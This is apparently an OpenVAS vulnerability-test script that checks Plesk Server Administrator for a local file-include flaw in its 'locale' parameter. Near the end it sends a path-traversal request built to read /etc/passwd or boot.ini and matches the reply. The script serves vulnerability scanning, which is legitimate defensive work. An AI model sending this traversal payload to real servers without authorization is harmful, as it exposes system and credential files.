###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_plesk_40813.nasl 14 2013-10-27 12:33:37Z jan $
#
# Plesk Server Administrator (PSA) 'locale' Parameter Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Plesk Server Administrator (PSA) is prone to a local file-
include vulnerability because it fails to properly sanitize
user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts in the
context of the webserver process. This may allow the attacker to
compromise the application and the underlying computer; other attacks
are also possible.";


if (description)
{
 script_id(100677);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-06-14 14:19:59 +0200 (Mon, 14 Jun 2010)");
 script_bugtraq_id(40813);

 script_name("Plesk Server Administrator (PSA) 'locale' Parameter Local File Include Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/40813");
 script_xref(name : "URL" , value : "http://www.parallels.com/");

 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if Plesk Server Administrator is prone to a local file include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 8443);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:8443);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");

foreach file (keys(files)) {
   
  url = string("/servlet/Help?system_id=pem&book_type=login&help_id=1&locale=/../../../../../../",files[file],"/00"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_warning(port:port);
    exit(0);

  }
}

exit(0);
